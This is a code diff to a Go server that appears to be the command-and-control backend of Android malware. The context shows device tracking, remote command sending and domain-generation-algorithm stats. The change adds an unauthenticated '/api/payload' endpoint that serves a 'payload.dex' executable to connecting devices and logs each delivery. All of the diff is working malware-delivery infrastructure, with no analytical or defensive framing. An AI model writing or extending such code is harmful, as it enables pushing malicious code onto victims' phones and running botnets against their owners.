@@ -5,6 +5,8 @@ import (
 	"fmt"
 	"log"
 	"net/http"
+	"os"
+	"path/filepath"
 	"time"
 
 	"github.com/gorilla/websocket"
@@ -22,8 +24,9 @@ type Config struct {
 	MasterSecret string `yaml:"master_secret"`
 	SupabaseURL  string `yaml:"supabase_url"`
 	SupabaseKey  string `yaml:"supabase_key"`
-	OfflineAfter int    `yaml:"offline_after_seconds"`
-	UseTLS       bool   `yaml:"use_tls"`
+	OfflineAfter   int    `yaml:"offline_after_seconds"`
+	PayloadDEXPath string `yaml:"payload_dex_path"`
+	UseTLS         bool   `yaml:"use_tls"`
 }
 
 type Server struct {
@@ -77,6 +80,9 @@ func (s *Server) Start() error {
 	mux.HandleFunc("/api/devices/", s.handleDeviceDetail)
 	mux.HandleFunc("/api/command", s.handleSendCommand)
 	mux.HandleFunc("/api/stats", s.handleStats)
+
+	// Payload DEX download
+	mux.HandleFunc("/api/payload", s.handlePayloadDownload)
 
 	// Dashboard
 	mux.HandleFunc("/", s.handleDashboard)
@@ -251,6 +257,31 @@ func (s *Server) handleStats(w http.ResponseWriter, r *http.Request) {
 		"dga_today":       dga.Today(),
 		"server_time":     time.Now().UTC(),
 	})
+}
+
+func (s *Server) handlePayloadDownload(w http.ResponseWriter, r *http.Request) {
+	payloadPath := s.config.PayloadDEXPath
+	if payloadPath == "" {
+		// Default path
+		payloadPath = "data/payload.dex"
+	}
+
+	absPath, err := filepath.Abs(payloadPath)
+	if err != nil {
+		http.Error(w, "invalid path", 500)
+		return
+	}
+
+	if _, err := os.Stat(absPath); os.IsNotExist(err) {
+		http.Error(w, "payload not available", 404)
+		log.Printf("payload DEX not found at %s", absPath)
+		return
+	}
+
+	w.Header().Set("Content-Type", "application/octet-stream")
+	w.Header().Set("Content-Disposition", "attachment; filename=\"payload.dex\"")
+	http.ServeFile(w, r, absPath)
+	log.Printf("payload DEX served to %s", r.RemoteAddr)
 }
 
 func (s *Server) periodicTasks() {
